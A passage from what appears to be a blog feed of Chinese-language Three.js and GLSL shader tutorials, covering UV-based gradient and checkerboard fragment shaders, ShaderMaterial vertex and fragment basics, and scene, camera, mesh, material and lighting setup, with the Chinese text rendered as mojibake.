class="code"><pre><span class="line">vec3 color1 = vec3(<span class="number">1.0</span>, <span class="number">1.0</span>, <span class="number">0.0</span>);</span><br><span class="line">vec3 color2 = vec3(<span class="number">0.0</span>, <span class="number">1.0</span>, <span class="number">1.0</span>); </span><br><span class="line">float mixer = (vUv.x + vUv.y) / <span class="number">2.0</span>;</span><br><span class="line">vec3 color = mix(color1, color2, mixer);</span><br><span class="line"><span class="comment">// mixer = step(0.5, mixer); // å¯¹è§’çº¿çªå˜</span></span><br><span class="line"><span class="comment">// vec3 color = vec3(mixer); // é»‘ç™½æ¸å˜</span></span><br><span class="line">gl_FragColor = vec4(color, <span class="number">1.0</span>);</span><br></pre></td></tr></table></figure><h5 id="4-2-7-æ£‹ç›˜æ ¼"><a href="#4-2-7-æ£‹ç›˜æ ¼" class="headerlink" title="4.2.7 æ£‹ç›˜æ ¼"></a>4.2.7 æ£‹ç›˜æ ¼</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vec3 color1 = vec3(<span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>);</span><br><span class="line">vec3 color2 = vec3(<span class="number">0.0</span>, <span class="number">1.0</span>, <span class="number">1.0</span>);</span><br><span class="line">float mask1 = step(<span class="number">0.5</span>, fract(vUv.x * <span class="number">3.0</span>));</span><br><span class="line">float mask2 = step(<span class="number">0.5</span>, fract(vUv.y * <span class="number">3.0</span>));</span><br><span class="line">float mixer = abs(mask1 - mask2);</span><br><span class="line">vec3 color = mix(color1, color2, mixer);</span><br><span class="line">gl_FragColor = vec4(color, <span class="number">1.0</span>);</span><br></pre></td></tr></table></figure><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://thebookofshaders.com/" target="_blank" rel="noopener">The Books of Shaders</a></li><li><a href="https://juejin.cn/post/7158032481302609950" target="_blank" rel="noopener">Three.js è¿›é˜¶ä¹‹æ—…ï¼šShaderç€è‰²å™¨å…¥é—¨</a></li><li><a href="">æ›´å¤šGLSLå†…ç½®å‡½æ•°</a></li></ul>]]></content>
      
      <categories>
          
          <category> åŠ¨ç”»/åª’ä½“ </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ç†è§£ Shader</title>
      <link href="/2024/12/02/threejs-Shader/"/>
      <url>/2024/12/02/threejs-Shader/</url>
      <content type="html"><![CDATA[<h3 id="1-ç‚¹çº¿é¢ä½“"><a href="#1-ç‚¹çº¿é¢ä½“" class="headerlink" title="1. ç‚¹çº¿é¢ä½“"></a>1. ç‚¹çº¿é¢ä½“</h3><p>æˆ‘ä»¬ç»˜åˆ¶ä¸€ä¸ªå®½é«˜<code>1*1</code>çš„å¹³é¢ï¼Œå¼€å¯çº¿æ¡†æ¨¡å¼ <em><code>wireframe: true</code></em>ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> geometry = <span class="keyword">new</span> THREE.PlaneGeometry(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">const</span> material = <span class="keyword">new</span> THREE.MeshBasicMaterial(&#123;</span><br><span class="line">    color: <span class="number">0x0ca678</span>,</span><br><span class="line">    wireframe: <span class="literal">true</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">const</span> mesh = <span class="keyword">new</span> THREE.Mesh(geometry, material);</span><br><span class="line">scene.add(mesh);</span><br></pre></td></tr></table></figure></p><p>ä½ ä¼šå‘ç°é»˜è®¤çš„å¹³é¢ç”±4ä¸ªé¡¶ç‚¹ï¼Œ2ä¸ªä¸‰è§’å½¢ç»„æˆã€‚<br>é¡¶ç‚¹è¿æˆçº¿ã€çº¿ç»„æˆä¸‰è§’å½¢ã€ä¸‰è§’å½¢ç»„æˆå‡ ä½•ä½“ï¼Œç«‹æ–¹ä½“ã€çƒä½“ç­‰äº¦æ˜¯å¦‚æ­¤ã€‚</p><p><img src="/2024/12/02/threejs-Shader/1.jpg" style="max-width:250px"></p><p>æ‰“å°å‡ ä½•ä½“ <em><code>console.log(geometry)</code></em><br><img src="/2024/12/02/threejs-Shader/2.jpg" style="max-width:500px"></p><p>å¯ä»¥çœ‹åˆ°attributesæºå¸¦çš„æ¯ä¸ªé¡¶ç‚¹çš„æ•°æ®ï¼Œé‡Œé¢åŒ…å«</p><h4 id="1-1-position"><a href="#1-1-position" class="headerlink" title="1.1 position"></a>1.1 <code>position</code></h4><p>é¡¶ç‚¹åæ ‡<br><img src="/2024/12/02/threejs-Shader/3.jpg" style="max-width:500px"><br><br></p><h4 id="1-2-uv-çº¹ç†åæ ‡"><a href="#1-2-uv-çº¹ç†åæ ‡" class="headerlink" title="1.2 uv çº¹ç†åæ ‡"></a>1.2 <code>uv</code> çº¹ç†åæ ‡</h4><p>uä»å·¦åˆ°å³å¢åŠ ï¼Œvä»ä¸‹åˆ°ä¸Šå¢åŠ ï¼ŒèŒƒå›´æ˜¯å·¦ä¸‹è§’(0,0)åˆ°å³ä¸Šè§’(1,1)ï¼Œå€ŸåŠ©uvå°±èƒ½æŠŠçº¹ç†å›¾ç‰‡è´´åˆ°3Dç‰©ä½“ä¸Šã€‚<code>uv</code>æ˜¯æ¯ä¸ªç‰‡å…ƒçš„æ•°å€¼ï¼Œå·¦ä¸‹è§’ vUv ä¸º (0.0, 0.0) æ‰€ä»¥å¯¹åº”çš„ vUv.x=vUv.y=0.0ã€‚åŒç†å·¦ä¸Šè§’å°±æ˜¯ (0.0, 1.0)ã€å³ä¸‹è§’ (1.0, 0.0)ã€å³ä¸Šè§’ (1.0, 1.0)ã€æœ€ä¸­é—´ (0.5, 0.5)ã€‚</p><p><img src="/2024/12/02/threejs-Shader/4.jpg" style="max-width:500px"></p><p>å¯ä»¥çœ‹åˆ°ç«‹æ–¹ä½“æ¯ä¸ªé¢éƒ½æœ‰å„è‡ªçš„ (0,0)-(1,1) uv å€¼ã€‚<br><img src="/2024/12/02/threejs-Shader/5.jpg" style="max-width:500px"></p><h4 id="1-3-normal"><a href="#1-3-normal" class="headerlink" title="1.3 normal"></a>1.3 <code>normal</code></h4><h3 id="2-ShaderMaterial"><a href="#2-ShaderMaterial" class="headerlink" title="2. ShaderMaterial"></a>2. ShaderMaterial</h3><p>ä½¿ç”¨<code>ShaderMaterial</code>æ¥åˆ›å»ºå‡ ä½•ä½“, å¹¶é€šè¿‡è®¾ç½®<code>vertexShader</code> å’Œ <code>fragmentShader</code>æ¥å®ç°è‡ªå®šä¹‰shaderæè´¨ï¼Œç”±<code>GPU</code>åˆ†åˆ«å¯¹æ¯ä¸ªé¡¶ç‚¹ã€æ¯ä¸ªç‰‡å…ƒç‹¬ç«‹æ‰§è¡Œï¼Œå¹¶ä¸”æ¯ä¸ªé¡¶ç‚¹æˆ–ç‰‡å…ƒéƒ½ä¸çŸ¥é“å…¶ä»–é¡¶ç‚¹æˆ–ç‰‡å…ƒçš„æ•°æ®ã€‚<br>åœ¨é¡¶ç‚¹ç€è‰²å™¨é‡Œéœ€è¦è®¾ç½®<code>gl_Position</code>,<code>gl_PointSize(å¯é€‰)</code> é¡¶ç‚¹ä½ç½®ï¼Œåœ¨ç‰‡å…ƒç€è‰²å™¨é‡Œéœ€è¦è®¾ç½®<code>gl_FragColor</code>ç‰‡å…ƒ/åƒç´ é¢œè‰²ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vertex = <span class="string">`</span></span><br><span class="line"><span class="string">  void main() &#123;</span></span><br><span class="line"><span class="string">    gl_Position = projectionMatrix * modelViewMatrix * vec4(position, 1.0);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fragment = <span class="string">`</span></span><br><span class="line"><span class="string">  void main() &#123;</span></span><br><span class="line"><span class="string">    gl_FragColor = vec4(1.0, 0.0, 0.0, 1.0);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">const</span> material = <span class="keyword">new</span> THREE.ShaderMaterial(&#123;</span><br><span class="line">  vertexShader: vertex,</span><br><span class="line">  fragmentShader: fragment</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h4 id="2-1-VertexShader-é¡¶ç‚¹ç€è‰²å™¨"><a href="#2-1-VertexShader-é¡¶ç‚¹ç€è‰²å™¨" class="headerlink" title="2.1 VertexShader é¡¶ç‚¹ç€è‰²å™¨"></a>2.1 VertexShader é¡¶ç‚¹ç€è‰²å™¨</h4><p>Vertex Shader ç”¨äºå®šä½å‡ ä½•ä½“çš„é¡¶ç‚¹ï¼Œå®ƒçš„å·¥ä½œåŸç†æ˜¯å‘é€é¡¶ç‚¹ä½ç½®ã€ç½‘æ ¼å˜æ¢ï¼ˆpositionã€æ—‹rotationå’Œ scaleç­‰ï¼‰ã€æ‘„åƒæœºä¿¡æ¯ï¼ˆpositionã€rotationã€fov ç­‰ï¼‰, GPU å°†æŒ‰ç…§ Vertex Shader ä¸­çš„æŒ‡ä»¤å¤„ç†è¿™äº›ä¿¡æ¯ï¼Œç„¶åå°†é¡¶ç‚¹æŠ•å½±åˆ° 2D ç©ºé—´ä¸­æ¸²æŸ“æˆ Canvasã€‚</p><p>æœ€ç®€å•çš„é¡¶ç‚¹ç€è‰²å™¨ä¹Ÿè¦è®¾ç½®è¿™ä¸€ä¸²ä¸œè¥¿ï¼Œä»¥ç¡®ä¿ä¸‰ç»´ç©ºé—´çš„ç‰©ä½“å‘ˆç°åœ¨äºŒç»´å±å¹•ä¸Šã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vertex = <span class="string">`</span></span><br><span class="line"><span class="string">  void main() &#123;</span></span><br><span class="line"><span class="string">    gl_Position = projectionMatrix * modelViewMatrix * vec4(position, 1.0);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">`</span>;</span><br></pre></td></tr></table></figure></p><p><strong>å¦‚ä½•ç†è§£è¿™ä¸€è¡Œä»£ç ï¼Ÿ</strong><br>å°†é¡¶ç‚¹åæ ‡<code>position</code>å˜æˆ<code>vec4</code>å››ç»´å‘é‡ï¼Œ<code>* modelMatrix</code>å°†æ¨¡å‹åŸæœ¬åæ ‡å˜æˆä¸–ç•Œåæ ‡é‡Œé€‚å½“çš„ä½ç½®å’Œå¤§å°ï¼Œå®ç°æƒ³è¦çš„åœºæ™¯ï¼›å†<code>* viewMatrix</code>è§†å›¾çŸ©é˜µå®ç°ç‰©ä½“ç›¸åŸºäºç›¸æœºçš„ä½ç½®ï¼Œè¿™ä¸¤æ­¥å¯ä»¥ç®€å†™ä¸º<code>modelViewMatrix</code>ï¼Œæœ€åå†<code>* projectionMatrix</code>å˜æ¢åˆ°è£å‰ªç©ºé—´ï¼Œå˜æˆäºŒç»´å±å¹•ä¸Šæ¸²æŸ“çš„æ•ˆæœã€‚</p><p>è¿™é‡Œçš„å˜é‡<code>modelViewMatrix</code>, <code>projectionMatrix</code>, <code>position</code>éƒ½æ˜¯<code>shaderMatrial</code>å†…ç½®å¯ä»¥ç›´æ¥æ‹¿æ¥ç”¨çš„ã€‚<code>uv</code>, <code>normal</code>åˆ™å¯ä»¥åœ¨é¡¶ç‚¹ç€è‰²å™¨é‡Œç›´æ¥ä½¿ç”¨ã€‚</p><h4 id="2-3-FragmentShader-ç‰‡å…ƒç€è‰²å™¨"><a href="#2-3-FragmentShader-ç‰‡å…ƒç€è‰²å™¨" class="headerlink" title="2.3 FragmentShader ç‰‡å…ƒç€è‰²å™¨"></a>2.3 FragmentShader ç‰‡å…ƒç€è‰²å™¨</h4><p>Fragment Shader åœ¨ Vertex Shader ä¹‹åæ‰§è¡Œï¼Œå®ƒçš„ä½œç”¨æ˜¯ä¸ºå‡ ä½•ä½“çš„æ¯ä¸ªå¯è§åƒç´ è¿›è¡Œç€è‰²ã€‚</p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://juejin.cn/post/7233359844974182437" target="_blank" rel="noopener">æ‰‹æŠŠæ‰‹å¸¦ä½ å…¥é—¨ Three.js Shader ç³»åˆ—ï¼ˆä¸€ï¼‰</a></li><li><a href="https://juejin.cn/post/7158032481302609950" target="_blank" rel="noopener">Three.js è¿›é˜¶ä¹‹æ—…ï¼šShaderç€è‰²å™¨å…¥é—¨</a></li></ul>]]></content>
      
      <categories>
          
          <category> åŠ¨ç”»/åª’ä½“ </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Three.js ä»å…¥é—¨åˆ°å…¥é—¨</title>
      <link href="/2024/12/02/threejs/"/>
      <url>/2024/12/02/threejs/</url>
      <content type="html"><![CDATA[<h3 id="1-åŸºæœ¬ç»„æˆ"><a href="#1-åŸºæœ¬ç»„æˆ" class="headerlink" title="1. åŸºæœ¬ç»„æˆ"></a>1. åŸºæœ¬ç»„æˆ</h3><h4 id="1-1-åœºæ™¯-Scene"><a href="#1-1-åœºæ™¯-Scene" class="headerlink" title="1.1 åœºæ™¯ Scene"></a>1.1 åœºæ™¯ Scene</h4><ul><li><em><code>new Three.Scene()</code></em> æ–°å»ºåœºæ™¯</li><li><em><code>add(objects)</code></em> æ·»åŠ ç‰©ä½“(åŒ…æ‹¬ç‚¹pointã€çº¿lineã€é¢triangleã€ä½“-ç”±å¤šä¸ªé¢ç»„æˆ)</li><li><em><code>add(light)</code></em> æ·»åŠ ç¯å…‰</li></ul><p><br></p><h4 id="1-2-ç…§ç›¸æœº-Camera"><a href="#1-2-ç…§ç›¸æœº-Camera" class="headerlink" title="1.2 ç…§ç›¸æœº Camera"></a>1.2 ç…§ç›¸æœº Camera</h4><ul><li><em><code>new Three.PerspectiveCamera(è§†é‡è§’åº¦, é•¿å®½æ¯”, è¿‘æˆªé¢, è¿œæˆªé¢)</code></em> æ–°å»ºé€è§†æ‘„åƒæœº</li><li><em><code>lookAt(mesh.position)</code></em> è®¾ç½®ç›¸æœºæŒ‡å‘</li><li><em><code>updateProjectionMatrix()</code></em> ä¿®æ”¹ç›¸æœºçš„è§†é‡è§’åº¦, é•¿å®½æ¯”, è¿‘æˆªé¢, è¿œæˆªé¢åï¼Œéœ€è¦è°ƒç”¨è¿™ä¸ªæ–¹æ³•é‡æ–°è®¡ç®—æŠ•å½±çŸ©é˜µ</li></ul><p><br></p><h4 id="1-3-æ¸²æŸ“å™¨-Renderer"><a href="#1-3-æ¸²æŸ“å™¨-Renderer" class="headerlink" title="1.3 æ¸²æŸ“å™¨ Renderer"></a>1.3 æ¸²æŸ“å™¨ Renderer</h4><p>ç…§ç›¸æœºå°†åœºæ™¯ä¸­çš„ç‰©ä½“æŠ•å½±åœ¨æ¸²æŸ“å™¨ä¸Šï¼Œç”»é¢æ˜¾ç¤ºåœ¨<code>canvas</code>ç”»å¸ƒä¸Šï¼Œ<code>canvas</code>æŒ‚è½½åœ¨<code>renderer.domElement</code>è¿™ä¸€divä¸Šã€‚</p><ul><li>new Three.WebGLRenderer()</li><li>setSize</li><li>setPixelRatio</li><li>render(scene, camera)</li><li>shadowMap.enabled</li><li>shadowMap.type</li><li>antialias: true æŠ—é”¯é½¿</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> THREE <span class="keyword">from</span> <span class="string">'three'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> scene = <span class="keyword">new</span> THREE.Scene();</span><br><span class="line"><span class="keyword">const</span> camera = <span class="keyword">new</span> THREE.PerspectiveCamera( <span class="number">75</span>, <span class="built_in">window</span>.innerWidth / <span class="built_in">window</span>.innerHeight, <span class="number">0.1</span>, <span class="number">1000</span> );</span><br><span class="line"><span class="keyword">const</span> renderer = <span class="keyword">new</span> THREE.WebGLRenderer();</span><br><span class="line">renderer.setSize(<span class="built_in">window</span>.innerWidth, <span class="built_in">window</span>.innerHeight);</span><br><span class="line">renderer.render(scene, camera);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(renderer.domElement);</span><br></pre></td></tr></table></figure><p><br></p><h3 id="2-ç‰©ä½“"><a href="#2-ç‰©ä½“" class="headerlink" title="2. ç‰©ä½“"></a>2. ç‰©ä½“</h3><h4 id="2-1-ç½‘æ ¼-Mesh"><a href="#2-1-ç½‘æ ¼-Mesh" class="headerlink" title="2.1 ç½‘æ ¼ Mesh"></a>2.1 ç½‘æ ¼ Mesh</h4><p><code>Mesh</code>è¡¨ç¤ºåœºæ™¯ä¸­çš„ç‚¹çº¿é¢ä½“ï¼Œè¿™äº›ç‰©ä½“éƒ½æ˜¯ç”±<code>geometry</code>å‡ ä½•ä½“å’Œ<code>material</code>æè´¨ç»„æˆã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ›å»ºmesh</span></span><br><span class="line"><span class="keyword">const</span> geometry = <span class="keyword">new</span> THREE.BoxGeometry( <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span> );</span><br><span class="line"><span class="keyword">const</span> material = <span class="keyword">new</span> THREE.MeshBasicMaterial( &#123; <span class="attr">color</span>: <span class="number">0x00ff00</span> &#125; );</span><br><span class="line"><span class="keyword">const</span> mesh = <span class="keyword">new</span> THREE.Mesh( geometry, material );</span><br><span class="line">scene.add(mesh);</span><br></pre></td></tr></table></figure></p><p><br></p><p><br></p><h4 id="2-2-ææ–™-Material"><a href="#2-2-ææ–™-Material" class="headerlink" title="2.2 ææ–™ Material"></a>2.2 ææ–™ Material</h4><ul><li>new MeshBasicMaterial({ color, wireframe, map })<ul><li>color: æè´¨é¢œè‰²</li><li>wireframe: å°†æè´¨æ¸²æŸ“ä¸ºçº¿æ¡†</li><li>map: ä½¿ç”¨è´´å›¾</li></ul></li></ul><p>å…¶ä»–æè´¨ï¼š</p><ul><li><code>MeshPhysicalMaterial</code>ç‰©ç†ç½‘ç»œæè´¨</li><li><code>MeshMatcapMaterial</code>é€‚ç”¨äºå…‰ç…§åœºæ™¯</li><li><code>MeshStandardMaterial</code>: <ul><li>roughness: æè´¨çš„ç²—ç³™ç¨‹åº¦ï¼Œ0è¡¨ç¤ºå¹³æ»‘çš„é•œé¢åå°„ï¼Œ1è¡¨ç¤ºå®Œå…¨æ¼«åå°„</li><li>metalness:</li></ul></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. å›¾ç‰‡è´´å›¾ï¼štextureLoader</span></span><br><span class="line"><span class="keyword">const</span> alphaTexture = textureLoader.load(<span class="string">'/textures/door/alpha.jpg'</span>)</span><br><span class="line"><span class="keyword">const</span> material = <span class="keyword">new</span> THREE.MeshBasicMaterial(&#123; <span class="attr">map</span>: alphaTexture &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. ç¯å¢ƒè´´å›¾ï¼š RGBELoader</span></span><br><span class="line"><span class="keyword">import</span> &#123; RGBELoader &#125; <span class="keyword">from</span> <span class="string">'three/examples/jsm/loaders/RGBELoader.js'</span></span><br><span class="line"><span class="keyword">const</span> rgbeLoader = <span class="keyword">new</span> RGBELoader()</span><br><span class="line">rgbeLoader.load(<span class="string">'./textures/environmentMap/2k.hdr'</span>, (environmentMap) =&gt; &#123;</span><br><span class="line">  environmentMap.mapping = THREE.EquirectangularReflectionMapping</span><br><span class="line">  scene.background = environmentMap</span><br><span class="line">  scene.environment = environmentMap</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. è‰ºæœ¯å­—</span></span><br><span class="line"><span class="keyword">import</span> &#123; FontLoader &#125; <span class="keyword">from</span> <span class="string">'three/examples/jsm/loaders/FontLoader.js'</span></span><br><span class="line"><span class="keyword">import</span> &#123; TextGeometry &#125; <span class="keyword">from</span> <span class="string">'three/examples/jsm/geometries/TextGeometry.js'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> textureLoader = <span class="keyword">new</span> THREE.TextureLoader()</span><br><span class="line"><span class="keyword">const</span> matcapTexture = textureLoader.load(<span class="string">'textures/matcaps/8.png'</span>)</span><br><span class="line">matcapTexture.colorSpace = THREE.SRGBColorSpace</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fontLoader = <span class="keyword">new</span> FontLoader()</span><br><span class="line">fontLoader.load(<span class="string">'/fonts/helvetiker_regular.typeface.json'</span>, font =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> material = <span class="keyword">new</span> THREE.MeshMatcapMaterial(&#123; <span class="attr">matcap</span>: matcapTexture &#125;)</span><br><span class="line">  <span class="keyword">const</span> textGeometry = <span class="keyword">new</span> TextGeometry(<span class="string">'hello world'</span>, &#123;</span><br><span class="line">    font,</span><br><span class="line">    size: <span class="number">0.5</span>,</span><br><span class="line">    height: <span class="number">0.2</span></span><br><span class="line">  &#125;)</span><br><span class="line">  textGeometry.center()</span><br><span class="line">  <span class="keyword">const</span> text = <span class="keyword">new</span> THREE.Mesh(textGeometry, material)</span><br><span class="line">  scene.add(text)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><br></p><h4 id="2-3-å‡ ä½•ä½“-Geometry"><a href="#2-3-å‡ ä½•ä½“-Geometry" class="headerlink" title="2.3 å‡ ä½•ä½“ Geometry"></a>2.3 å‡ ä½•ä½“ Geometry</h4><ul><li>BoxGeometry</li><li>BufferGeometry</li><li>PlaneGeometry<br>å°†ä¿¡æ¯ï¼ˆä¾‹å¦‚é¡¶ç‚¹ä½ç½®ï¼Œé¢ç´¢å¼•ï¼Œæ³•çº¿ï¼Œé¢œè‰²ï¼Œuvå’Œä»»ä½•è‡ªå®šä¹‰å±æ€§ï¼‰å­˜å‚¨åœ¨buffersï¼ˆFloat32Array, BufferAttributeï¼‰ä¸­ã€‚</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ›å»ºä¸€ä¸ªçŸ©å½¢. åœ¨è¿™é‡Œæˆ‘ä»¬å·¦ä¸Šå’Œå³ä¸‹é¡¶ç‚¹è¢«å¤åˆ¶äº†ä¸¤æ¬¡ã€‚</span></span><br><span class="line"><span class="comment">// å› ä¸ºåœ¨ä¸¤ä¸ªä¸‰è§’é¢ç‰‡é‡Œï¼Œè¿™ä¸¤ä¸ªé¡¶ç‚¹éƒ½éœ€è¦è¢«ç”¨åˆ°ã€‚</span></span><br><span class="line"><span class="keyword">const</span> geometry = <span class="keyword">new</span> THREE.BufferGeometry();</span><br><span class="line"><span class="keyword">const</span> vertices = <span class="keyword">new</span> <span class="built_in">Float32Array</span>( [</span><br><span class="line">  <span class="number">-1.0</span>, <span class="number">-1.0</span>,  <span class="number">1.0</span>,</span><br><span class="line">  <span class="number">1.0</span>, <span class="number">-1.0</span>,  <span class="number">1.0</span>,</span><br><span class="line">  <span class="number">1.0</span>,  <span class="number">1.0</span>,  <span class="number">1.0</span>,</span><br><span class="line"></span><br><span class="line">  <span class="number">1.0</span>,  <span class="number">1.0</span>,  <span class="number">1.0</span>,</span><br><span class="line">  <span class="number">-1.0</span>,  <span class="number">1.0</span>,  <span class="number">1.0</span>,</span><br><span class="line">  <span class="number">-1.0</span>, <span class="number">-1.0</span>,  <span class="number">1.0</span></span><br><span class="line">] );</span><br><span class="line"></span><br><span class="line"><span class="comment">// itemSize = 3 å› ä¸ºæ¯ä¸ªé¡¶ç‚¹éƒ½æ˜¯ä¸€ä¸ªä¸‰å…ƒç»„ã€‚</span></span><br><span class="line">geometry.setAttribute( <span class="string">'position'</span>, <span class="keyword">new</span> THREE.BufferAttribute( vertices, <span class="number">3</span> ) );</span><br><span class="line"><span class="keyword">const</span> material = <span class="keyword">new</span> THREE.MeshBasicMaterial( &#123; <span class="attr">color</span>: <span class="number">0xff0000</span> &#125; );</span><br><span class="line"><span class="keyword">const</span> mesh = <span class="keyword">new</span> THREE.Mesh( geometry, material );</span><br></pre></td></tr></table></figure><p>å‡ ä½•ä½“çš„å±æ€§å’Œæ–¹æ³•</p><ul><li>attributes å‡ ä½•ä½“ç›¸åº”çš„buffer</li><li>position è®¾ç½®ä½ç½®</li><li>scale ç¼©æ”¾</li><li>rotation æ—‹è½¬</li><li>translate ç§»åŠ¨</li><li>lookAt è®¾ç½®æœå‘</li></ul><h4 id="2-4-å˜æ¢-transform"><a href="#2-4-å˜æ¢-transform" class="headerlink" title="2.4 å˜æ¢ transform"></a>2.4 å˜æ¢ transform</h4><p>å˜åŒ–meshçš„å±æ€§ï¼Œåæ ‡è½´<code>AxesHelp()</code>è¾…åŠ©å®ç°</p><ul><li>position ä½ç½®</li><li>rotation æ—‹è½¬</li><li>scale ç¼©æ”¾</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mesh.scale.set(radius, radius, radius)</span><br><span class="line">mesh.rotation.x = <span class="number">1</span></span><br><span class="line">mesh.position.x = <span class="number">1</span></span><br><span class="line">mesh.position.copy(mesh2.position)</span><br></pre></td></tr></table></figure><h4 id="2-5-ç»„åˆ-Group"><a href="#2-5-ç»„åˆ-Group" class="headerlink" title="2.5 ç»„åˆ Group"></a>2.5 ç»„åˆ Group</h4><p>å°†å¤šä¸ªç‰©ä½“æ”¾å…¥ä¸€ä¸ªç»„åˆä¸­åšæ—‹è½¬ï¼Œä¼šä»¥ç»„åˆä¸­å¿ƒæ•´ä½“æ—‹è½¬ã€‚ä¸€ä¸ªç‰©ä½“å¯ä»¥æ”¾è¿›å¤šä¸ª<code>Group</code>ä¸­ï¼ˆå¯ä»¥åšå¤ªé˜³ç³»æ•ˆæœï¼‰</p><p><br></p><h3 id="3-å…‰"><a href="#3-å…‰" class="headerlink" title="3. å…‰"></a>3. å…‰</h3><p>ç¯å…‰å’Œæè´¨ç´§å¯†ç›¸å…³ã€‚</p><h4 id="3-1-å…‰çº¿-Light"><a href="#3-1-å…‰çº¿-Light" class="headerlink" title="3.1 å…‰çº¿ Light"></a>3.1 å…‰çº¿ Light</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// AmbientLight ç¯å¢ƒå…‰ï¼Œå‡åŒ€çš„ç…§äº®åœºæ™¯ä¸­çš„æ‰€æœ‰ç‰©ä½“</span></span><br><span class="line"><span class="keyword">const</span> ambientLight = <span class="keyword">new</span> THREE.AmbientLight(<span class="number">0xffffff</span>, <span class="number">1.5</span>)</span><br><span class="line">scene.add(ambientLight)</span><br><span class="line"></span><br><span class="line"><span class="comment">// PointLight ç‚¹å…‰æºï¼Œä»ä¸€ä¸ªç‚¹å‘å„ä¸ªæ–¹å‘å‘å°„çš„å…‰æº</span></span><br><span class="line"><span class="keyword">const</span> pointLight = <span class="keyword">new</span> 